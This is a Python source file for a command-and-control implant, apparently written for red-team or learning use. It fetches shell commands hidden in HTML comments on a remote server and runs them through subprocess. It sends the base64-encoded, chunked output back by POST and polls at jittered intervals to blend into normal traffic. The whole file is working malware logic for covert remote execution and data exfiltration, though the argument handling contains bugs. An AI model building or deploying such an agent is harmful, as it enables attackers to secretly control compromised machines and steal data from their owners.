# Agent python file to be ran on a given agent (Currently designed to run on Linux)
import math
import base64
import requests 
import time 
import subprocess
from bs4 import BeautifulSoup, Comment
import uuid
import argparse
import random
import sys
#Import the beautiful soup python library to parse HTML files

class pythonAgent(): 

    def __init__(self, domain, agentId, commEndPoint):
        """Agent class:x
            domain - domain that the agent references
            endpoint - the given endpoint that a given agent references
            """
        
        self.domain = domain  
        self.agentId = agentId
        self.commEndPoint = commEndPoint
    
    def run(self): 
        '''Runs the rest of the commands ot be able to execute on the server '''
        # Makes Request to the server for text
        text = self._make_request()
        # Text is parsed and commands are extracted
        command_list = self._extract_html(text)
        # Commands are passed to be executed
        stdout = self._execute_command(command_list)
        # Sends the outputs of the commands back to the webC2 server
        self._send_results(stdout=stdout)

    def _make_request(self):
        """
        Makes a request to the currently set web server in self.domain
        """
        #requests.get extracts all of the web content that is given in the index.html file. Including comments
        r = requests.get(self.domain)

        return r.text

    def _extract_html(self,text): 
        """
        Extracts given commands from the HTML including any updates to domain and more
        """
        text = self._make_request() 

        #Searches through all of the html comments on a given webpage
        soup = BeautifulSoup(text, 'html.parser')
        comments = soup.find_all(string=lambda text: isinstance(text, Comment))

        # Process each comment to eliminate whitespace and create lists delimited by spaces
        processed_comments = []
        for comment in comments:
            # Strip whitespace and split into words (this removes \n and creates a list)
            words = comment.strip().split()
            #We utilize extend here, as it takes the contents from words, and adds to process_comments
            processed_comments.extend(words)
        
        print(processed_comments)

        return processed_comments 
            #parses: 
            # commands
            # domain currently being used
            # updates to how the commands will be encoded?? 


    def _execute_command(self,command_list): 
        """
        Executes commands (passed in as a parameter of a list) in order to run
        """
        result = None
        try:
            '''
            Returns a CompletedProcess object with the following attributes: 
            - .returncode
            - .stdout 
            - .stderr 
            - .args 
            '''

            result = subprocess.run(
                command_list,
                    capture_output=True,
                    text=True,
                    check=True,
            )        
        except subprocess.CalledProcessError as e: 
            print(f"Command failed {e.stderr}")
        except Exception as e: 
            print(f"Error: {e}")

        return result.stdout

    def _send_results(self, stdout): 
        """
        Sends the results of a command back to the C2 server via a POST.
        - stdout: the string output from the command (could be empty on error).
        """
        #Encode the stdout in base64 to be later decoded  
        b64_output = base64.b64encode(stdout.encode()).decode()

        # Chunking the message out into smaller chunks that are then sent to the server and recomposed on that end
        chunk_size = 20 
        total_len = len(b64_output)
        chunk_count = math.ceil(total_len / chunk_size)
        #Generate a random uuid for the message id 
        message_id = str(uuid.uuid4())

        #Set the endpoint that the json will communicate back to, this is determined by the agent compot
        url = self.domain + self.commEndPoint  

        #Go through the chunk count and generate the code 
        for i in range(chunk_count): 
            start = i * chunk_size
            end = start + chunk_size
            chunk = b64_output[start:end]

            #Generate a json payload to be sent back to the server
            payload = {
                "timestamp": int(time.time()), # epoch seconds
                "message_id": message_id,
                "agent_id": self.agentId, 
                "chunk_index": i, 
                "chunk_size": chunk_size, 
                "chunk_count": chunk_count,
                "chunk_data": chunk,
            }

            #Attempt to send this using a HTML POSt and sending over the json 
            try:
                r = requests.post(url, json=payload, timeout=5)
                r.raise_for_status()
                print(f"[+] Results successfully sent (status {r.status_code})")
            except requests.RequestException as e:
                #Flesh out with more information on what to do if this fails...
                print(f"[-] Failed to send results: {e}") 

if __name__ == "__main__": 
    #Check the length of the inputted arguements to catch for potential erorrs
    if len(sys.argv) == 1:
        parser = argparse.ArgumentParser(
            description='Python Agent for C2 Communication',
            formatter_class=argparse.RawDescriptionHelpFormatter,
            epilog='''
Examples:
  python agent.py --domain http://127.0.0.1:5000 --endpoint /results
  python agent.py -d https://example.com -e /api/results --min-interval 5 --max-interval 15
            '''
        )
        parser.add_argument('--domain', '-d', required=True, help='Domain URL for the C2 server (e.g., http://127.0.0.1:5000)')
        parser.add_argument('--endpoint', '-e', required=True, help='Endpoint path for communication (e.g., /results)')
        parser.add_argument('--min-interval', type=int, default=5, help='Minimum interval between runs in seconds (default: 5)')
        parser.add_argument('--max-interval', type=int, default=30, help='Maximum interval between runs in seconds (default: 30)')
        parser.print_help()
        sys.exit(1)
    

    #Obtain the args 
    args = parser.parse_args()

    # If the min interval is set ot be higher than the max interval exit
    if args.min_interval > args.max_interval:
        print("Error: min-interval cannot be greater than max-interval")
        sys.exit(1)
    
    # Create agent with the given arguements
    agent = pythonAgent(
        domain=args.domain, 
        commEndPoint=args.endpoint, 
        agentId=str(uuid.uuid4())
    )
    
    # Print status statements in the terminal

    print(f"[+] Agent started with ID: {agent.agentId}")
    print(f"[+] Domain: {args.domain}")
    print(f"[+] Endpoint: {args.endpoint}")
    print(f"[+] Jitter range: {args.min_interval}-{args.max_interval} seconds")
    print("[+] Starting continuous operation... (Press Ctrl+C to stop)")
    
    # Loop that controls the agents requests on a timer jitter is utilized to attempt to mimic more "human" traffic conditions
    while True:
        try:
            # Run the agent
            agent.run()
            
            # Calculate random jitter interval
            jitter_interval = random.uniform(args.min_interval, args.max_interval)
            print(f"[+] Sleeping for {jitter_interval:.2f} seconds...")
            
            # Sleep for the jittered interval
            time.sleep(jitter_interval)
            
        except KeyboardInterrupt:
            print("\n[!] Received interrupt signal. Shutting down agent...")
            break
        except Exception as e:
            print(f"[-] Error occurred: {e}")
            # A delay before an attempted restart 
            time.sleep(5)
            continue